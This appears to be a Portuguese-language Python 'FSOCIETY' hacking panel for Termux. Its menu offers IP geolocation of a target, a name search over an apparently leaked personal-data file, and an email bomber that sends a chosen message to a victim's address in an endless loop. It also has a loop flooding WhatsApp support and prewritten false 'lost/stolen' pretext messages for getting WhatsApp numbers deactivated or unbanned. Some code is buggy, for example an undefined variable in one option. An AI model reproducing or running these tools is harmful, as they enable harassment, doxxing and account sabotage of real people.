#####################
# FUNÇÕES & MODULOS #
#####################

global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"


import os, sys, smtplib, json, requests
from time import sleep

try:
	import pyfiglet
except:
	os.system('pip install pyfiglet')
def clear():
	os.system('clear')
def x():
	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
	
####################
#                  #
#  MENU PRINCIPAL  #          
#                  #
####################


while True:
	clear()
	print(f'    {G}——— {C}[{R}*{C}] CODIFICADO POR: {G}LIPEZIN{C} and {G}Sweet{C} [{R}*{C}]{G} ———')
	result = pyfiglet.figlet_format(" MENU", font = "5lineoblique" )

	print(f'''{C}{G}{result}''')
	print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
	print(f'   //--==--==--==--==--==--==--==--==--==--==--\\')
	print(f'   11                                         11')
	print(f'   11 {C}[{G}01{C}]{R} CONSULTA IP {C}[{G}ON{C}]{C}                   11')
	print(f'   11 {C}[{G}02{C}]{R} CONSULTA NOME{C} [{G}ON{C}]                 11')
	print(f'   11 {C}[{G}03{C}]{R} TEXTOS SUPORTE   {C}                  11')
	print(f'   11 {C}[{G}04{C}]{R} NMAP           {C}                    11')
	print(f'   11 {C}[{G}05{C}]{R}                    OFF {C}            11')
	print(f'   11 {C}[{G}06{C}]{R} PACKs (PRESENTES)        {C}          11')
	print(f'   11 {C}[{G}07{C}]{R} EMAIL BOMBER             {C}          11')
	print(f'   11 {C}[{G}08{C}]{R} RESETAR TEMPO DO COD    {C}           11')
	print(f'   11 {C}[{G}09{C}]{R} TIRAR NÚMERO DO BAN      {C}          11')
	print(f'   11 {C}[{G}10{C}]{R} phoneinfoga off             {C}          11')
	print(f'   11 {C}[{G}11{C}]{R} MOSTRAR MEU IP           {C}          11')
	print(f'   11 {C}[{G}12{C}]{R} CONSULTA CNPJ{C} [{G}ON{C}]       {C}          11')
	print(f'   11                                         11')
	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
	print(f'   //                                         \\1')
	print(f'   11 {C}[{G}NUM{C}]{R} NÚMERO DOS CRIADORES       {C}       11')
	print(f'   11 {C}[{G}FSO{C}]{R} rastrear numero     {C}       11')
	print(f'   11 {C}[{G}EXIT{C}]{R} ENCERRAR A FERRAMENTA  {C}          11')
	print(f'   11                                         11')
	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
	choice = input(f'\n\n\n{R}   >>>{C} ')
	
	
	if choice == '4':
		        os.system('git clone https://github.com/nmap/nmap')
		        
		 
		
	
	
###################
# OPCAO 12 - CNPJ #	
###################
	if choice == '12':
				#59291534000167
				while True:
					clear()
					result = pyfiglet.figlet_format(" CONSULTA\n     CNPJ", font = "slant" )
					print(f'''{C}{G}
					{result}''')
					x()
					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
					print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
					cnpj_alvo = input(f'{G}       DIGITE O CNPJ{R} >>>{C} ')
					if cnpj_alvo == 'X':
						break
					print(f'   {C}//--==--==--==--==--==--==--==--==--==--==--\\')
					cnpj_data = requests.get('https://www.receitaws.com.br/v1/cnpj/{}'.format(cnpj_alvo)).json()
					print(f'\n\n           {G}       DADOS ABAIXO')
					print(f'   {C}//--==--==--==--==--==--==--==--==--==--==--\\ \n')
					print(cnpj_data)
					print(f'\n\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
					cnpj_menu = input(f'\n{R}   >>>{C} ')
					if cnpj_menu == 'X':
						break
	

	
###########################
# OPC 11 - MOSTRAR MEU IP #
###########################	
	
	if choice == '11':
			clear()
			print(f'\n\n               {G}DADOS DO SEU IP ATUAL: ')
			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
			print(f'{C}   [{R}*{C}] pode ser usado para testar VPNs!')
			ip_ch = requests.get('http://ip-api.com/json/')
			ip_ch = ip_ch.json()
			status = ip_ch["status"]
			country = ip_ch["country"]
			countryCode = ip_ch["countryCode"]
			region = ip_ch["region"]
			regionName = ip_ch["regionName"]
			city = ip_ch["city"]
			zip = ip_ch["zip"]
			lat = ip_ch["lat"]
			lon = ip_ch["lon"]
			timezone = ip_ch["timezone"]
			isp = ip_ch["isp"]
			org = ip_ch["org"]
			AS = ip_ch["as"]
			query = ip_ch["query"]
			print('\n')
			print(f'{G}   STATUS:{C}', status)
			print(f'{G}   COUNTRY:{C}', country)
			print(f'{G}   COUNTRYCODE:{C}', countryCode)
			print(f'{G}   REGION:{C}', region)
			print(f'{G}   REGION NAME:{C}', regionName)
			print(f'{G}   CITY:{C}', city)
			print(f'{G}   ZIP:{C}', zip)
			print(f'{G}   LAT:{C}', lat)
			print(f'{G}   LON:{C}', lon)
			print(f'{G}   TIMEZONE:{C}', timezone)
			print(f'{G}   ISP:{C}', isp)
			print(f'{G}   ORG:{C}', org)
			print(f'{G}   AS:{C}', AS)
			print(f'{G}   QUERY:{C}', query)

			print(f'\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA RETORNAR AO MENU.')
			iptrack = input(f'\n\n{R}   >>>{C} ')
			
			

	
	
######################
# IP TRACKER - OPC 1 #
######################
	
	if choice == '1':
		while True:
			clear()
			result = pyfiglet.figlet_format("IP TRACKER", font = "slant" )
			print(f'''{C}{G}{result}''')
			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
			
			x()
			ipvitma = input(f'\n{G}   IP TARGET{R} >>>{C} ')
			if ipvitma == 'X':
				break
			print(f'\n\n\n                 {G} LISTA DOS DADOS: ')
			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
			ip_ch = requests.get('http://ip-api.com/json/{}'.format(ipvitma))
			ip_ch = ip_ch.json()
			status = ip_ch["status"]
			country = ip_ch["country"]
			countryCode = ip_ch["countryCode"]
			region = ip_ch["region"]
			regionName = ip_ch["regionName"]
			city = ip_ch["city"]
			zip = ip_ch["zip"]
			lat = ip_ch["lat"]
			lon = ip_ch["lon"]
			timezone = ip_ch["timezone"]
			isp = ip_ch["isp"]
			org = ip_ch["org"]
			AS = ip_ch["as"]
			query = ip_ch["query"]
			print('\n')
			print(f'{G}   STATUS:{C}', status)
			print(f'{G}   COUNTRY:{C}', country)
			print(f'{G}   COUNTRYCODE:{C}', countryCode)
			print(f'{G}   REGION:{C}', region)
			print(f'{G}   REGION NAME:{C}', regionName)
			print(f'{G}   CITY:{C}', city)
			print(f'{G}   ZIP:{C}', zip)
			print(f'{G}   LAT:{C}', lat)
			print(f'{G}   LON:{C}', lon)
			print(f'{G}   TIMEZONE:{C}', timezone)
			print(f'{G}   ISP:{C}', isp)
			print(f'{G}   ORG:{C}', org)
			print(f'{G}   AS:{C}', AS)
			print(f'{G}   QUERY:{C}', query)

			print(f'\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
			iptrack = input(f'\n\n{R}   >>>{C} ')
			if iptrack == 'X':
				break

######################
# RESETAR COD DO ZAP #
######################
	
	if choice == '8':
		while True:
			clear()
			result = pyfiglet.figlet_format("RESETA COD", font = "slant" )
			print(f'''{C}{G}{result}''')
			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
			print(f'   --==--==--==--==--==--==--==--==--==--==--\n')
			print(f'   {C}[{G}OBS{C}] nós não teremos acesso a senha de seu email!\n         o código está aberto para comprovar isso.')
			x()
			email = input(f'{G}   SEU EMAIL:{C} ')
			if email == 'X':
				break
			sender_email = "{}".format(email)
			rec_email = "support@whatsapp.com"
			password = input(str(f"   {G}DIGITE A SENHA:{C} "))
			if password == 'X':
				break
			number = input(f'{G}   DIGITE SEU NÚMERO (EX: +55 51 9****-****):{C} ')
			if msgf == 'X':
				break
			subject = "titulo"
			message = "oi"
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(sender_email, password)
			print(f"{C}   [{R}*{C}]{G} LOGIN EFETUADO!")
			while True:
				server.sendmail(sender_email, rec_email, message)
				print(f"{G}O EMAIL FOI ENVIADO COM SUCESSO! ALVO:{R}", rec_email)
			
	
	
	############################
	# EMAILBOMBER PERSONALIZAV #
	################№###########
	
	
	
	if choice == '7':
		while True:
			clear()
			result = pyfiglet.figlet_format("email bomber", font = "slant" )
			print(f'''{C}{G}{result}''')
			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
			print(f'   --==--==--==--==--==--==--==--==--==--==--\n')
			print(f'   {C}[{G}OBS{C}] nós não teremos acesso a senha de seu email!\n         o código está aberto para comprovar isso.')
			x()
			alvo = input(f'\n\n{G}   EMAIL DO ALVO:{C} ')
			if alvo == 'X':
				break
			email = input(f'{G}   SEU EMAIL:{C} ')
			if email == 'X':
				break
			sender_email = "{}".format(email)
			rec_email = "{}".format(alvo)
			password = input(str(f"   {G}DIGITE A SENHA:{C} "))
			if password == 'X':
				break
			msgf = input(f'{G}   MENSAGEM QUE IRÁ SER ENVIADA:{C} ')
			if msgf == 'X':
				break
			subject = "oi"
			message = "{}".format(msgf)
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(sender_email, password)
			print(f"{C}   [{R}*{C}]{G} LOGIN EFETUADO!")
			while True:
				server.sendmail(sender_email, rec_email, message)
				print(f"{G}O EMAIL FOI ENVIADO COM SUCESSO! ALVO:{R}", rec_email)
			

#############################
# OPÇÃO 3 - TEXTOS SUPORTES #
#############################


	if choice == '3':
		while True:
			clear()
			result = pyfiglet.figlet_format(" TEXTOS", font = "slant" )
			print(f'''{C}{G}
			{result}''')
			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
			print(f'\n\n{C}   --==--==--==--==--==--\n')
			print(f'   {C}[{G}01{C}]{R} TEXTO DESATIVAÇÃO')
			print(f'   {C}[{G}02{C}]{R} TEXTOS TIRAR DO BAN')
			print(f'   {C}[{G}03{C}]{R} TEXTOS RESETAR COD')
			print(f'\n{C}   --==--==--==--==--==--')
			print(f'   {C}[{G}X{C}]{R} RETORNAR')
			choice_txt = input(f'\n\n{R}   >>>{C} ')
			if choice_txt == 'X':
				break
				
				#########################
				# OPÇÃO 3 - RESETAR COD #
				#########################
			if choice_txt == '3':
				while True:
					clear()
					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
					print(f'{C}             --==--==--==--==--==--\n')
					print(f'{G}   Assunto: Não consigo receber código de verificação do whatsapp{C}\nMeu número (número) está no suporte ,alguém solicitou o código por engano. Meu número uso para trabalho tenho uma empresa de empreendimento e preciso desta conta por favor retirem meu número. Reiniciem meu código SMS')
					print(f'\n{C}             --==--==--==--==--==--\n')
					x()
					ban = input(f'\n   {R}>>>{C} ')
					if ban == 'X':
						break
						
						
			###########№###############	
			# OPÇÃO 2 - TXT's SUPORTE #
			#############№#############
			
			if choice_txt == '2':
				while True:
					clear()
					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
					print(f'{C}             --==--==--==--==--==--\n')
					print(f'{G}   Assunto: Meu numero novo foi banido sem nenhum motivo.\n   {C}Meu número é novo,e com ele abri recentemente uma indústria e nessa indústria necessito urgentemente da minha conta não desrespeitei nenhuma regra da política de privacidade,logo peço que a Equipe de suporte do whatsapp tome providências o mais rapido possivel para eu poder ter acesso aos materiais da minha indústria [numero]')
					print(f'\n{C}             --==--==--==--==--==--\n')
					x()
					ban = input(f'\n   {R}>>>{C} ')
					if ban == 'X':
						break
						
						

					
				
						
#################################
# TXT'S SUPORTE - 1 DESATIVAÇÃO #		#################################
			
			
			if choice_txt == '1':
				while True:
					clear()
					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
					print(f'{C}             --==--==--==--==--==--\n')
					print(f'\n   {G}Assunto:Perdido/Roubado\n{C}   Meu número foi perdido e roubado, teriam como vocês desativá-lo? Ele contêm dados importates Número:\n')
					print(f'{C}             --==--==--==--==--==--\n')
					print(f'{G}   Assunto: Perdido/Roubado{C}\n   Por favor, desativem o número da minha conta o chip e os documentos foram roubados essa conta possui dados importantes, então por favor desativem minha conta, número:')
					print(f'\n{C}             --==--==--==--==--==--\n')
					x()
					choice_txt = input(f'\n\n   {R}>>>{C} ')
					if choice_txt == 'X':
						break
						
												
	
	
##################
# OPĆÃO 2 - NOME #
##################
	
	
	if choice == '2':
		while True:
			print(f'    {C}======================================')
			clear()
			print(f'\n{R}         ──▄────▄▄▄▄▄▄▄────▄───\n         ─▀▀▄─▄█████████▄─▄▀▀──\n         ─────██─▀███▀─██──────\n         ───▄─▀████▀████▀─▄────\n         ─▀█────██▀█▀██────█▀──')
			print(f'\n    {C}[{G}X{C}] VOLTAR PARA O MENU')
			print(f'\n    {C}======================================')
			name = input(f'    {R}>>> ')
			print(f'    {C}======================================')
			print(f'\n    {C}[{R}AGUARDE!{C}]', end='')
			print(' O NOME {} ESTÁ SENDO ANALIZADO...'.format(name))
			os.system('grep -R {} /data/data/com.termux/files/home/painelfso/dados.txt'.format(name))
			print(f'\n{C}    [{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
			if name == 'X':
				break
			a = input(f'\n    {R}>>> ')
			if a == '0':
				break
	
	
######################################
# OPÇÃO  MENU - JUNTAR SE A FSOCIETY #
######################################


	if choice == 'FSO':
	    os.system('termux-open-url https://abre.ai/google-consulta-nmr ')
	
	
####################
#OPÇÃO EXIT - MENU #
####################

		
	if choice == 'EXIT':
		break
	
######################################
# OPÇÃO [NUM] - NUMERO DOS CRIADORES #
######################################
	
	
	if choice == 'NUM':
		clear()
		print(f'{R}   \n      ──▄────▄▄▄▄▄▄▄────▄───\n      ─▀▀▄─▄█████████▄─▄▀▀──\n      ─────██─▀███▀─██──────\n      ───▄─▀████▀████▀─▄────\n      ─▀█────██▀█▀██────█▀──')
		x()
		print(f'\n   {R}OBS:{C} AMBOS SÃO DESENVOLVEDORES DESSA FERRAMENTA.')
		print('\n')
		print(f'\n   --==--==--==--==--==--==')
		print(f'\n   {C}[{G}01{C}] NÚMERO DO SWEET')
		print(f'   {C}[{G}02{C}] NÚMERO DO LIPEZIN')
		print(f'\n   --==--==--==--==--==--==')
		choice_number_creators = input(f'\n\n\n{R}   >>>{C} ')
		if choice_number_creators == 'X':
			break
		if choice_number_creators == '1':
			os.system('termux-open-url https://WA.me/5551997773672 ')
		if choice_number_creators == '2':
			os.system('termux-open-url https://WA.me/553588317681')
